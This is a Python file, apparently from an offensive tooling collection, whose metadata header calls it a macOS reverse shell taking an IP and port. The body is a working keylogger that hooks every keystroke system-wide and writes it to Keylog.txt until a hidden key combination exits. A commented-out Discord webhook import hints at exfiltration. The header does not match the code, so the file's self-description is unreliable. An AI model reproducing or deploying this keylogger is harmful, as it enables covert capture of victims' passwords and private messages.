
METADATA = {
    "name":       "reverse_shell",
    "platform":   "macos",
    "language":   "python",
    "category":   "base",
    "variant":    "default",
    "args":       ["ip", "port"],
    "returns":    "str",
    "author":     "diputs-sudo"
}

import keyboard
import sys
import time
import os
# from discord_webhook import webhook

def log_key(key):
    # Log the key to the file
    with open("Keylog.txt", "a") as log_file:
        log_file.write(key)

# Initialize the keylog file (clear previous log)
with open("Keylog.txt", "w") as log_file:
    pass

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            log_key(" ")  # Log actual space instead of "SPACE"
        elif event.name == "enter":
            log_key("[ENTER]")  # New line for readability
        elif event.name == "tab":
            log_key("[TAB]")  # Log tab correctly
        elif event.name == "esc":
            log_key("[ESC]")
        elif event.name == "capslock":
            log_key("[CAPSLOCK]")
        elif event.name == "shift":
            log_key("[SHIFT]")
        elif event.name == "ctrl":
            log_key("[CTRL]")
        elif event.name == "alt":
            log_key("[ALT]")
        elif event.name == "backspace":
            log_key("[BACKSPACE]")
        elif event.name == "delete":
            log_key("[DELETE]")
        elif event.name == "up":
            log_key("[UP]")
        elif event.name == "down":
            log_key("[DOWN]")
        elif event.name == "left":
            log_key("[LEFT]")
        elif event.name == "right":
            log_key("[RIGHT]")
        elif event.name == "f1":
            log_key("[F1]")
        elif event.name == "f2":
            log_key("[F2]")
        elif event.name == "f3":
            log_key("[F3]")
        elif event.name == "f4":
            log_key("[F4]")
        elif event.name == "f5":
            log_key("[F5]")
        elif event.name == "f6":
            log_key("[F6]")
        elif event.name == "f7":
            log_key("[F7]")
        elif event.name == "f8":
            log_key("[F8]")
        elif event.name == "f9":
            log_key("[F9]")
        elif event.name == "f10":
            log_key("[F10]")
        elif event.name == "f11":
            log_key("[F11]")
        elif event.name == "f12":
            log_key("[F12]")
        elif event.name == "printscreen":
            log_key("[PRINTSCREEN]")
        elif event.name == "scrolllock":
            log_key("[SCROLLLOCK]")
        elif event.name == "pause":
            log_key("[PAUSE]")
        elif event.name == "insert":
            log_key("[INSERT]")
        elif event.name == "home":
            log_key("[HOME]")
        elif event.name == "pageup":
            log_key("[PAGEUP]")
        elif event.name == "pagedown":
            log_key("[PAGEDOWN]")
        elif event.name == "end":
            log_key("[END]")
        elif event.name == "numlock":
            log_key("[NUMLOCK]")
        elif event.name == "app":
            log_key("[APP]")
        elif event.name == "menu":
            log_key("[MENU]")
        elif event.name == "windows":
            log_key("[WINDOWS]")
        elif event.name == "command":
            log_key("[COMMAND]")
        elif event.name == "option":
            log_key("[OPTION]")
        elif event.name == "alt+tab":
            log_key("[ALT+TAB]")
        elif event.name == "ctrl+shift":
            log_key("[CTRL+SHIFT]")
        elif event.name == "ctrl+alt":
            log_key("[CTRL+ALT]")
        elif event.name == "alt+shift":
            log_key("[ALT+SHIFT]")
        elif event.name in ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                            "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                            "u", "v", "w", "x", "y", "z"]:
            log_key(event.name)
        elif event.name in ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]:
            log_key(event.name)
        elif event.name in ["!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
                            "-", "_", "=", "+", "[", "{", "]", "}", ";", ":",
                            "'", '"', ",", "<", ".", ">", "/", "?", "\\", "|",
                            "`", "~"]:
            log_key(event.name)
       
def check_exit_combo():
    while True:
        if keyboard.is_pressed('ctrl') and keyboard.is_pressed('alt') and keyboard.is_pressed('shift') and keyboard.is_pressed('Space'):
            print("Ctrl+Alt+Shift pressed. Exiting...")
            os._exit(0)
        time.sleep(0.1)  # Prevents CPU overuse

# Start the key hook
keyboard.hook(on_key_event)

# Run the combo checker in a separate thread
import threading
threading.Thread(target=check_exit_combo, daemon=True).start()

# Wait indefinitely for keyboard events
keyboard.wait()


